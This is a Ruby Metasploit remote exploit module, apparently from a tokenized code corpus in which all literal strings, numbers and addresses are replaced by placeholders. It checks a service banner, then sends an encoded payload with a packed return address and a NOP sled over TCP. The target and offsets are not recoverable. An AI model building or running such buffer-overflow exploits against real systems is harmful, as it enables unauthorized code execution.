require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = AverageRanking include Msf :: Exploit :: Remote :: Tcp def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> ] , <str> = > [ ARCH_X86 ] , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , ] , <str> = > false , <str> = > { <str> = > <str> , } , <str> = > { <str> = > <int> , <str> = > <str> , } , <str> = > [ <str> ] , <str> = > [ [ <str> , { <str> = > <hex> } ] , [ <str> , { <str> = > <hex> } ] , [ <str> , { <str> = > <hex> } ] , [ <str> , { <str> = > <hex> } ] , [ <str> , { <str> = > <hex> } ] , ] , <str> = > <str> ) ) register_options ( [ Opt :: RPORT ( <int> ) , ] , self . class ) end def check connect banner = sock . get_once || <str> disconnect if banner . to_s =~ <str> return Exploit :: CheckCode :: Detected end return Exploit :: CheckCode :: Safe end def exploit connect sploit = <str> + payload . encoded + [ target [ <str> ] ] . pack ( <str> ) + make_nops ( <int> ) sock . put ( sploit + <str> ) handler disconnect end end 
